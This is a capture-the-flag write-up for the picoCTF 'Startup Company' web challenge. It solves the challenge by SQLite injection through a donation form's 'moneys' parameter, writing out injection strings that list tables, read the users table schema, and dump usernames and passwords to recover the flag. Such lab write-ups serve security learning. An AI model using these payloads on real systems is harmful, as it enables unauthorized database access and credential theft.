---
description: SQLite injection
---

# Startup Company \(180\)

## Problem

Do you want to fund my startup? 

{% embed url="http://mercury.picoctf.net:5070/" %}

## Solution

![](../../.gitbook/assets/e48e746db6734b4faa91e2a7cd354ce9.png)

The query probably looks something like:

```sql
UPDATE some_table
SET 
    latest_contribution = <POST.moneys>
WHERE
    user_id = <SESSION.user_id>
```

So we can get information displayed in the green text by manipulating the `moneys=` parameter:

![](../../.gitbook/assets/69736eaa20634168b28afd74b366f2bf.png)

The SQLite version is 3.22.0:

![](../../.gitbook/assets/71b28b0ba90c4d118356b410cd704bb7.png)

### Getting Table Names

`captcha=23&moneys=' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master)`

Note that `GROUP_CONCAT` is required to concatenate all the `tbl_name` values into a single string. Otherwise, we might miss out on some valuable data.

![](../../.gitbook/assets/bb2a73e36a344a9e9120b9bd82021c73.png)

### Getting Column Names

`captcha=53&moneys='|| (SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='startup_users');`

![](../../.gitbook/assets/f6198ce6109f44f1ba1d30543bf9c6ba.png)

### Dumping Data

`captcha=36&moneys='|| (SELECT GROUP_CONCAT(nameuser) FROM startup_users);`

![](../../.gitbook/assets/3f58fc451ff04cad9192181c09eacc26.png)

Indeed, our flag is hidden in the `wordpass` value for the `the_real_flag` user!

`captcha=66&moneys='|| (SELECT GROUP_CONCAT(wordpass) FROM startup_users);`

![](../../.gitbook/assets/ae414d1d97154c6998412d1746e9862f.png)



